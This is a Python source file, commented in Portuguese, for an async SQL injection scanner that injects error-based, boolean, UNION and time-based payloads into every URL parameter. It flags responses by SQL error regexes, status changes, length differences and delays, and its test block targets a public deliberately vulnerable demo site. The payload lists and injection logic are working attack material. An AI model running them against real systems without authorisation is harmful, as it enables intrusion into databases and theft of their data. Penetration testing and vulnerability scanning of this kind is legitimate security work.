#!/usr/bin/env python3
"""
LIBERTUS SQLi DETECTION ENGINE v2.0
Validação ROBUSTA com:
- Múltiplos payloads por técnica
- Comparação de respostas (baseline vs payload)
- Detecção de padrões de erro SQL
- Análise de mudanças estruturais
- Proof of Concept real
"""

import asyncio
import aiohttp
from typing import Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import re


class SQLiDetectionEngine:
    """Engine de detecção de SQLi com validação robusta"""
    
    def __init__(self):
        # Payloads organizados por técnica
        self.payloads = {
            'error_based': [
                "'",
                "\"",
                "' OR '1'='1",
                "\" OR \"1\"=\"1",
                "' OR 1=1--",
                "\" OR 1=1--",
                "'; WAITFOR DELAY '0:0:5'--",
                "1' AND 1=2 UNION SELECT NULL--",
            ],
            'boolean_based': [
                "1' AND '1'='1",
                "1' AND '1'='2",
                "1 AND 1=1",
                "1 AND 1=2",
                "' AND 'x'='x",
                "' AND 'x'='y",
            ],
            'union_based': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "1' UNION SELECT table_name FROM information_schema.tables--",
            ],
            'time_based': [
                "'; WAITFOR DELAY '00:00:05'--",
                "' OR SLEEP(5)--",
                "1' AND SLEEP(5)--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            ]
        }
        
        # Padrões de erro SQL de diferentes DBs
        self.sql_error_patterns = [
            # MySQL
            r"you have an error in your sql syntax",
            r"warning.*mysql",
            r"mysql_fetch",
            r"mysql_num_rows",
            r"supplied argument is not a valid mysql",
            
            # PostgreSQL
            r"postgresql.*error",
            r"pg_query\(\)",
            r"pg_exec\(\)",
            r"warning.*\Wpg_",
            
            # MSSQL
            r"microsoft sql server",
            r"odbc sql server driver",
            r"sqlserver jdbc driver",
            r"sqlexception",
            r"unclosed quotation mark",
            
            # Oracle
            r"ora-\d{5}",
            r"oracle.*error",
            r"warning.*\Woci_",
            
            # SQLite
            r"sqlite",
            r"sqlite3::SQLException",
            
            # Generic
            r"sql syntax.*error",
            r"syntax error.*near",
            r"unexpected end of sql",
            r"quoted string not properly terminated",
            r"invalid query",
        ]
        
        self.sql_error_regex = re.compile('|'.join(self.sql_error_patterns), re.IGNORECASE)
    
    async def detect_sqli(self, url: str, timeout: int = 10) -> Dict:
        """
        Detecta SQLi com validação robusta
        
        Returns:
            {
                'vulnerable': bool,
                'technique': str,
                'payload': str,
                'evidence': Dict,
                'confidence': float,
                'proof': Dict
            }
        """
        
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=timeout)) as session:
            # 1. BASELINE: resposta normal
            baseline = await self._get_baseline(session, url)
            
            if not baseline:
                return {'vulnerable': False, 'reason': 'Failed to get baseline'}
            
            # 2. TESTAR CADA TÉCNICA
            for technique, payloads in self.payloads.items():
                for payload in payloads:
                    result = await self._test_payload(
                        session,
                        url,
                        payload,
                        baseline,
                        technique
                    )
                    
                    if result['vulnerable']:
                        return result
            
            return {'vulnerable': False, 'reason': 'No SQLi detected'}
    
    async def _get_baseline(self, session: aiohttp.ClientSession, url: str) -> Optional[Dict]:
        """Obtém resposta baseline (normal)"""
        
        try:
            async with session.get(url) as resp:
                return {
                    'status': resp.status,
                    'text': await resp.text(),
                    'headers': dict(resp.headers),
                    'length': len(await resp.text())
                }
        except Exception as e:
            print(f"   ⚠️  Baseline error: {e}")
            return None
    
    async def _test_payload(
        self,
        session: aiohttp.ClientSession,
        url: str,
        payload: str,
        baseline: Dict,
        technique: str
    ) -> Dict:
        """
        Testa um payload e compara com baseline
        
        Validações:
        1. SQL error messages
        2. Status code changes
        3. Content length changes (>20%)
        4. Response time (para time-based)
        """
        
        # Injetar payload em todos os parâmetros
        test_url = self._inject_payload(url, payload)
        
        try:
            import time
            start_time = time.time()
            
            async with session.get(test_url) as resp:
                response_time = time.time() - start_time
                response_text = await resp.text()
                response_length = len(response_text)
                
                # VALIDAÇÃO 1: SQL Error Messages
                sql_errors = self.sql_error_regex.findall(response_text)
                
                if sql_errors:
                    return {
                        'vulnerable': True,
                        'technique': 'error_based',
                        'payload': payload,
                        'confidence': 0.95,
                        'evidence': {
                            'sql_errors': sql_errors[:3],
                            'url': test_url
                        },
                        'proof': {
                            'method': 'SQL Error Detection',
                            'baseline_length': baseline['length'],
                            'payload_length': response_length,
                            'errors_found': len(sql_errors)
                        }
                    }
                
                # VALIDAÇÃO 2: Status Code Change
                if resp.status != baseline['status']:
                    # 500 = possível SQL error
                    if resp.status == 500:
                        return {
                            'vulnerable': True,
                            'technique': technique,
                            'payload': payload,
                            'confidence': 0.7,
                            'evidence': {
                                'status_change': f"{baseline['status']} -> {resp.status}",
                                'url': test_url
                            },
                            'proof': {
                                'method': 'HTTP 500 after payload',
                                'baseline_status': baseline['status'],
                                'payload_status': resp.status
                            }
                        }
                
                # VALIDAÇÃO 3: Content Length Change (>20%)
                baseline_len = baseline['length']
                len_diff = abs(response_length - baseline_len) / baseline_len if baseline_len > 0 else 0
                
                if len_diff > 0.2:  # >20% de mudança
                    # Para boolean-based, verificar se é uma mudança consistente
                    if technique == 'boolean_based':
                        # Testar payload TRUE vs FALSE
                        is_boolean = await self._verify_boolean_sqli(
                            session, url, payload, baseline
                        )
                        
                        if is_boolean:
                            return {
                                'vulnerable': True,
                                'technique': 'boolean_based',
                                'payload': payload,
                                'confidence': 0.85,
                                'evidence': {
                                    'length_change': f"{len_diff:.1%}",
                                    'url': test_url
                                },
                                'proof': {
                                    'method': 'Boolean-based blind SQLi',
                                    'baseline_length': baseline_len,
                                    'true_payload_length': response_length,
                                    'difference': f"{len_diff:.1%}"
                                }
                            }
                
                # VALIDAÇÃO 4: Time-based (response time >4s)
                if technique == 'time_based' and response_time > 4:
                    # Verificar se é consistente
                    is_time_based = await self._verify_time_based_sqli(
                        session, url, payload, response_time
                    )
                    
                    if is_time_based:
                        return {
                            'vulnerable': True,
                            'technique': 'time_based',
                            'payload': payload,
                            'confidence': 0.9,
                            'evidence': {
                                'response_time': f"{response_time:.2f}s",
                                'url': test_url
                            },
                            'proof': {
                                'method': 'Time-based blind SQLi',
                                'baseline_time': '<1s',
                                'payload_time': f"{response_time:.2f}s",
                                'delay_seconds': 5
                            }
                        }
                
        except Exception as e:
            # Timeout pode indicar time-based SQLi
            if technique == 'time_based' and 'timeout' in str(e).lower():
                return {
                    'vulnerable': True,
                    'technique': 'time_based',
                    'payload': payload,
                    'confidence': 0.8,
                    'evidence': {
                        'timeout': str(e),
                        'url': test_url
                    },
                    'proof': {
                        'method': 'Time-based blind SQLi (timeout)',
                        'timeout': '10s'
                    }
                }
        
        return {'vulnerable': False}
    
    def _inject_payload(self, url: str, payload: str) -> str:
        """Injeta payload em todos os parâmetros da URL"""
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Se não tem parâmetros, adiciona um genérico
        if not params:
            return f"{url}?id={payload}"
        
        # Injeta em cada parâmetro
        for key in params.keys():
            params[key] = [payload]
        
        new_query = urlencode(params, doseq=True)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
    
    async def _verify_boolean_sqli(
        self,
        session: aiohttp.ClientSession,
        url: str,
        payload: str,
        baseline: Dict
    ) -> bool:
        """
        Verifica boolean-based SQLi testando TRUE vs FALSE
        """
        
        # Payload TRUE (já testamos)
        # Agora testar payload FALSE
        false_payload = payload.replace("'1'='1", "'1'='2").replace("1=1", "1=2").replace("'x'='x", "'x'='y")
        
        if false_payload == payload:
            return False
        
        false_url = self._inject_payload(url, false_payload)
        
        try:
            async with session.get(false_url) as resp:
                false_text = await resp.text()
                false_length = len(false_text)
                
                # Boolean SQLi: TRUE retorna diferente de FALSE
                true_length = len(baseline['text'])  # Assumindo que já temos TRUE
                
                # Diferença entre TRUE e FALSE deve ser significativa
                if abs(true_length - false_length) / max(true_length, false_length, 1) > 0.1:
                    return True
        
        except:
            pass
        
        return False
    
    async def _verify_time_based_sqli(
        self,
        session: aiohttp.ClientSession,
        url: str,
        payload: str,
        first_time: float
    ) -> bool:
        """
        Verifica time-based SQLi testando novamente
        Deve ser consistente (sempre ~5s)
        """
        
        test_url = self._inject_payload(url, payload)
        
        try:
            import time
            start = time.time()
            async with session.get(test_url) as resp:
                second_time = time.time() - start
                await resp.text()
                
                # Ambos devem ter delay ~5s
                if second_time > 4 and abs(first_time - second_time) < 2:
                    return True
        
        except:
            pass
        
        return False


# Teste
if __name__ == "__main__":
    async def test():
        engine = SQLiDetectionEngine()
        
        # Teste em site vulnerável conhecido
        result = await engine.detect_sqli("http://testphp.vulnweb.com/artists.php?artist=1")
        
        print("🔬 SQLi Detection Engine v2.0 - TESTE")
        print("="*60)
        print(f"Vulnerable: {result.get('vulnerable')}")
        if result.get('vulnerable'):
            print(f"Technique: {result['technique']}")
            print(f"Payload: {result['payload']}")
            print(f"Confidence: {result['confidence']:.0%}")
            print(f"Evidence: {result['evidence']}")
            print(f"Proof: {result['proof']}")
    
    asyncio.run(test())
